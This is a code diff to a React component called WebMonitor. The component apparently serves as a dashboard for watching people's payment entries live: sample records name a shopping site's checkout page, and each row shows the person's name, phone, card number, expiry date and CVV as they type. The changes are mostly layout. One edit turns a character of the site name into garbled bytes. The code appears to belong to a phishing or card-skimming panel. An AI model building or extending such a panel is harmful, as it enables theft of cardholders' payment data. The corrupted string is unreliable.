@@ -98,7 +98,7 @@ const submissionData: UserSubmission[] = [
     status: "processing",
     statusText: "处理中",
     submissionType: "credit_card",
-    websiteName: "电商购物网",
+    websiteName: "电商��物网",
     currentPage: "/checkout/payment",
     userName: "李小红",
     userLocation: "上海市浦东区",
@@ -276,56 +276,44 @@ export function WebMonitor() {
               </div>
 
               {/* 中部：卡的类型、手机号、姓名、卡号、有效期、CVV */}
-              <div className="grid grid-cols-6 gap-1 mb-1">
-                <div>
+              <div className="flex items-center justify-between mb-1">
+                <div className="flex items-center gap-1">
+                  <div className="text-xs text-muted-foreground">💳</div>
                   {submission.binLookup ? (
-                    <div className="flex items-center gap-1">
-                      <div className="text-xs text-muted-foreground">💳</div>
-                      <Badge
-                        variant="outline"
-                        className={`text-xs px-2 py-1 ${
-                          submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
-                          submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
-                          submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
-                          "bg-gray-50 text-gray-600 border-gray-200"
-                        }`}
-                      >
-                        {submission.binLookup.cardType}
-                      </Badge>
-                    </div>
+                    <Badge
+                      variant="outline"
+                      className={`text-xs px-1.5 py-0.5 ${
+                        submission.binLookup.cardType === "credit" ? "bg-blue-50 text-blue-600 border-blue-200" :
+                        submission.binLookup.cardType === "debit" ? "bg-green-50 text-green-600 border-green-200" :
+                        submission.binLookup.cardType === "prepaid" ? "bg-orange-50 text-orange-600 border-orange-200" :
+                        "bg-gray-50 text-gray-600 border-gray-200"
+                      }`}
+                    >
+                      {submission.binLookup.cardType}
+                    </Badge>
                   ) : (
-                    <div className="text-sm font-medium">识别中...</div>
+                    <span className="text-xs">识别中...</span>
                   )}
                 </div>
 
-                <div>
-                  <div className="text-sm font-mono">
-                    {submission.realtimeInput?.phone || 'N/A'}
-                  </div>
+                <div className="text-sm font-mono">
+                  {submission.realtimeInput?.phone || 'N/A'}
                 </div>
 
-                <div>
-                  <div className="text-sm font-medium">
-                    {submission.userName}
-                  </div>
+                <div className="text-sm font-medium">
+                  {submission.userName}
                 </div>
 
-                <div>
-                  <div className="text-sm font-mono">
-                    {submission.realtimeInput?.cardNumber || 'N/A'}
-                  </div>
+                <div className="text-sm font-mono">
+                  {submission.realtimeInput?.cardNumber || 'N/A'}
                 </div>
 
-                <div>
-                  <div className="text-sm font-mono">
-                    {submission.realtimeInput?.expiryDate || 'N/A'}
-                  </div>
+                <div className="text-sm font-mono">
+                  {submission.realtimeInput?.expiryDate || 'N/A'}
                 </div>
 
-                <div>
-                  <div className="text-sm font-mono">
-                    {submission.realtimeInput?.cvv || 'N/A'}
-                  </div>
+                <div className="text-sm font-mono">
+                  {submission.realtimeInput?.cvv || 'N/A'}
                 </div>
               </div>
 
